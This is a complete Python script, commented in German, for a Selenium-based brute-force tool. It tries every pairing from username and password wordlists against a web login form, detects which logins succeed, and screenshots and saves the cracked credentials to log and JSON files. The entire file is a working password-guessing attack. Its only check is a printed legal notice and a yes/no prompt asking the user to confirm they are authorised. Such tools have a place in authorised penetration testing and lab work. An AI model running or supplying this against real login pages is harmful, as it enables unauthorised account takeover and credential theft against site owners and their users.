#!/usr/bin/env python3

import json
import os
import sys
import time
from datetime import datetime
from pathlib import Path
import argparse

# Selenium Imports
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, NoSuchElementException
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.firefox.service import Service as FirefoxService
except ImportError:
    print("FEHLER: Selenium ist nicht installiert!")
    print("Installiere es mit: pip install selenium")
    sys.exit(1)


class BruteForceSelenium:
    """Selenium-basiertes Brute-Force-Tool für Login-Formulare"""

    def __init__(self, config_path="config.json"):
        """Initialisiert das Brute-Force-Tool mit Konfiguration"""
        self.config = self.load_config(config_path)
        self.driver = None
        self.results = []
        self.attempts = 0
        self.successful_logins = []

        # Erstelle Log-Dateien
        self.log_file = Path(self.config["log_file"])
        self.log_file.parent.mkdir(parents=True, exist_ok=True)

        # Initialisiere Log
        self.init_log()

    def load_config(self, config_path):
        """Lädt Konfiguration aus JSON-Datei"""
        if not os.path.exists(config_path):
            print(f"FEHLER: Konfigurationsdatei nicht gefunden: {config_path}")
            print("Erstelle Standard-Konfiguration...")
            return self.create_default_config()

        with open(config_path, 'r', encoding='utf-8') as f:
            return json.load(f)

    def create_default_config(self):
        """Erstellt Standard-Konfiguration"""
        return {
            "target_url": "http://192.168.1.188:5001/login",
            "username_field": "username",
            "password_field": "password",
            "submit_button_type": "submit",
            "success_indicators": {
                "url_contains": "/",
                "url_not_contains": "/login"
            },
            "browser": "chrome",
            "headless": False,
            "delay_between_attempts": 1.0,
            "page_load_timeout": 10,
            "usernames_file": "wordlists/usernames.txt",
            "passwords_file": "wordlists/passwords.txt",
            "log_file": "results/brute_force_log.txt",
            "screenshots_dir": "results/screenshots",
            "max_attempts": 0
        }

    def init_webdriver(self):
        """Initialisiert den Selenium WebDriver"""
        print(f"Initialisiere {self.config['browser'].upper()} WebDriver...")

        try:
            if self.config["browser"].lower() == "chrome":
                options = webdriver.ChromeOptions()
                if self.config["headless"]:
                    options.add_argument("--headless")
                    options.add_argument("--disable-gpu")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--window-size=1920,1080")
                self.driver = webdriver.Chrome(options=options)

            elif self.config["browser"].lower() == "firefox":
                options = webdriver.FirefoxOptions()
                if self.config["headless"]:
                    options.add_argument("--headless")
                self.driver = webdriver.Firefox(options=options)

            else:
                print(f"FEHLER: Nicht unterstützter Browser: {self.config['browser']}")
                sys.exit(1)

            self.driver.set_page_load_timeout(self.config["page_load_timeout"])
            print("WebDriver erfolgreich initialisiert")

        except Exception as e:
            print(f"FEHLER beim Initialisieren des WebDrivers: {e}")
            print("\nHilfe:")
            print("- Chrome: Stelle sicher, dass ChromeDriver installiert ist")
            print("- Firefox: Stelle sicher, dass GeckoDriver installiert ist")
            sys.exit(1)

    def load_wordlists(self):
        """Lädt Username- und Password-Listen"""
        print("Lade Wörterbücher...")

        usernames = self.load_file(self.config["usernames_file"])
        passwords = self.load_file(self.config["passwords_file"])

        print(f"{len(usernames)} Benutzernamen geladen")
        print(f"{len(passwords)} Passwörter geladen")
        print(f"Gesamt-Kombinationen: {len(usernames) * len(passwords)}")

        return usernames, passwords

    def load_file(self, filepath):
        """Lädt Zeilen aus einer Datei"""
        if not os.path.exists(filepath):
            print(f"WARNUNG: Datei nicht gefunden: {filepath}")
            return []

        with open(filepath, 'r', encoding='utf-8') as f:
            # Filter leere Zeilen und Kommentare
            lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]

        return lines

    def init_log(self):
        """Initialisiert die Log-Datei"""
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write("\n" + "="*80 + "\n")
            f.write(f"BRUTE-FORCE SESSION GESTARTET: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target URL: {self.config['target_url']}\n")
            f.write("="*80 + "\n\n")

    def test_login(self, username, password):
        """Testet ein Username/Password-Paar"""
        try:
            # Navigiere zur Login-Seite
            self.driver.get(self.config["target_url"])

            # Warte bis Seite geladen ist
            WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.NAME, self.config["username_field"]))
            )

            # Finde und fülle Formularfelder
            username_field = self.driver.find_element(By.NAME, self.config["username_field"])
            password_field = self.driver.find_element(By.NAME, self.config["password_field"])

            username_field.clear()
            password_field.clear()

            username_field.send_keys(username)
            password_field.send_keys(password)

            # Finde und klicke Submit-Button
            submit_button = self.driver.find_element(By.CSS_SELECTOR, f"button[type='{self.config['submit_button_type']}']")
            submit_button.click()

            # Warte kurz auf Response
            time.sleep(1)

            # Prüfe Erfolg
            success = self.check_login_success()

            return success

        except TimeoutException:
            print(f"TIMEOUT bei Login-Versuch: {username}")
            return False
        except NoSuchElementException as e:
            print(f"FEHLER: Element nicht gefunden: {e}")
            return False
        except Exception as e:
            print(f"FEHLER beim Login-Test: {e}")
            return False

    def check_login_success(self):
        """Prüft, ob der Login erfolgreich war"""
        current_url = self.driver.current_url

        # Prüfe URL-basierte Indikatoren
        success_indicators = self.config["success_indicators"]

        # Prüfe ob URL bestimmten String enthält
        if "url_contains" in success_indicators:
            if success_indicators["url_contains"] in current_url:
                # Aber nicht wenn auch url_not_contains drin ist
                if "url_not_contains" in success_indicators:
                    if success_indicators["url_not_contains"] not in current_url:
                        return True
                else:
                    return True

        # Prüfe auf Fehler-Messages (Flash-Messages)
        try:
            flash_messages = self.driver.find_elements(By.CSS_SELECTOR, ".alert-danger, .error")
            if flash_messages:
                return False
        except:
            pass

        # Prüfe ob wir noch auf Login-Seite sind
        if "/login" in current_url:
            return False

        return False

    def take_screenshot(self, username):
        """Erstellt Screenshot bei erfolgreichem Login"""
        try:
            screenshot_dir = Path(self.config["screenshots_dir"])
            screenshot_dir.mkdir(parents=True, exist_ok=True)

            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = screenshot_dir / f"success_{username}_{timestamp}.png"

            self.driver.save_screenshot(str(filename))
            print(f"Screenshot gespeichert: {filename}")

            return str(filename)
        except Exception as e:
            print(f"FEHLER beim Screenshot: {e}")
            return None

    def log_result(self, username, password, success, screenshot=None):
        """Loggt einen Login-Versuch"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        status = "[ERFOLG]" if success else "[FEHLGESCHLAGEN]"

        log_entry = f"[{timestamp}] {status} | User: {username} | Pass: {password}"
        if screenshot:
            log_entry += f" | Screenshot: {screenshot}"
        log_entry += "\n"

        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry)

    def run(self):
        """Hauptfunktion: Führt Brute-Force-Angriff durch"""
        print("\n" + "="*80)
        print("STARTE SELENIUM BRUTE-FORCE ANGRIFF")
        print("="*80 + "\n")

        # Lade Wörterbücher
        usernames, passwords = self.load_wordlists()

        if not usernames or not passwords:
            print("FEHLER: Keine Wörterbücher geladen. Abbruch.")
            return

        # Initialisiere WebDriver
        self.init_webdriver()

        # Berechne Gesamtanzahl
        total_combinations = len(usernames) * len(passwords)
        max_attempts = self.config["max_attempts"]
        if max_attempts > 0:
            total_combinations = min(total_combinations, max_attempts)

        print(f"\nTeste {total_combinations} Kombinationen...")
        print(f"Verzögerung zwischen Versuchen: {self.config['delay_between_attempts']}s")
        print(f"Ziel: {self.config['target_url']}\n")

        start_time = time.time()

        # Durchlaufe alle Kombinationen
        for i, username in enumerate(usernames, 1):
            for j, password in enumerate(passwords, 1):
                self.attempts += 1

                # Progress
                progress = (self.attempts / total_combinations) * 100
                print(f"[{self.attempts}/{total_combinations}] ({progress:.1f}%) Testing: {username}:{password}", end="")

                # Teste Login
                success = self.test_login(username, password)

                if success:
                    print(" [ERFOLG]")
                    screenshot = self.take_screenshot(username)
                    self.successful_logins.append({
                        "username": username,
                        "password": password,
                        "timestamp": datetime.now().isoformat(),
                        "screenshot": screenshot
                    })
                    self.log_result(username, password, True, screenshot)
                else:
                    print(" [X]")
                    self.log_result(username, password, False)

                # Delay
                time.sleep(self.config["delay_between_attempts"])

                # Prüfe max_attempts
                if max_attempts > 0 and self.attempts >= max_attempts:
                    print(f"\nWARNUNG: Maximale Anzahl Versuche erreicht: {max_attempts}")
                    break

            if max_attempts > 0 and self.attempts >= max_attempts:
                break

        # Zusammenfassung
        elapsed_time = time.time() - start_time
        self.print_summary(elapsed_time)

    def print_summary(self, elapsed_time):
        """Gibt Zusammenfassung aus"""
        print("\n" + "="*80)
        print("ZUSAMMENFASSUNG")
        print("="*80)
        print(f"Gesamtdauer: {elapsed_time:.2f} Sekunden")
        print(f"Versuche: {self.attempts}")
        print(f"Erfolgreiche Logins: {len(self.successful_logins)}")

        if self.successful_logins:
            print("\nGEFUNDENE CREDENTIALS:")
            print("-" * 80)
            for cred in self.successful_logins:
                print(f"  Username: {cred['username']}")
                print(f"  Password: {cred['password']}")
                print(f"  Time: {cred['timestamp']}")
                if cred['screenshot']:
                    print(f"  Screenshot: {cred['screenshot']}")
                print("-" * 80)

            # Speichere erfolgreiche Credentials
            self.save_successful_credentials()
        else:
            print("\nKeine erfolgreichen Logins gefunden.")

        print(f"\nVollständiges Log: {self.log_file}")
        print("="*80 + "\n")

    def save_successful_credentials(self):
        """Speichert erfolgreiche Credentials als JSON"""
        output_file = Path("results/successful_credentials.json")
        output_file.parent.mkdir(parents=True, exist_ok=True)

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(self.successful_logins, f, indent=2, ensure_ascii=False)

        print(f"Erfolgreiche Credentials gespeichert: {output_file}")

    def close(self):
        """Beendet den WebDriver"""
        if self.driver:
            self.driver.quit()
            print("WebDriver geschlossen")


def main():
    """Hauptfunktion mit Argument-Parsing"""
    parser = argparse.ArgumentParser(
        description="Selenium Brute-Force Tool für Login-Formulare",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Beispiele:
  python brute_force_selenium.py
  python brute_force_selenium.py --config custom_config.json
  python brute_force_selenium.py --headless
  python brute_force_selenium.py --browser firefox --delay 2.0

        """
    )

    parser.add_argument(
        '--config',
        default='config.json',
        help='Pfad zur Konfigurationsdatei (default: config.json)'
    )
    parser.add_argument(
        '--headless',
        action='store_true',
        help='Führe Browser im Headless-Mode aus (kein Fenster)'
    )
    parser.add_argument(
        '--browser',
        choices=['chrome', 'firefox'],
        help='Browser-Wahl (überschreibt config.json)'
    )
    parser.add_argument(
        '--delay',
        type=float,
        help='Verzögerung zwischen Versuchen in Sekunden (überschreibt config.json)'
    )

    args = parser.parse_args()

    # Rechtlicher Hinweis
    print("\n" + "="*80)
    print("RECHTLICHER HINWEIS")
    print("="*80)
    print("Dieses Tool ist NUR für autorisierte Penetrationstests gedacht!")
    print("="*80)

    response = input("\nBestätigen Sie, dass Sie berechtigt sind, dieses Tool zu verwenden? (ja/nein): ")
    if response.lower() not in ['ja', 'yes', 'y', 'j']:
        print("Abgebrochen.")
        sys.exit(0)

    try:
        # Initialisiere Brute-Force-Tool
        bf = BruteForceSelenium(config_path=args.config)

        # Überschreibe Config mit CLI-Argumenten
        if args.headless:
            bf.config["headless"] = True
        if args.browser:
            bf.config["browser"] = args.browser
        if args.delay:
            bf.config["delay_between_attempts"] = args.delay

        # Starte Brute-Force
        bf.run()

    except KeyboardInterrupt:
        print("\n\nWARNUNG: Abbruch durch Benutzer (Ctrl+C)")
    except Exception as e:
        print(f"\nFEHLER: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Cleanup
        try:
            bf.close()
        except:
            pass


if __name__ == "__main__":
    main()
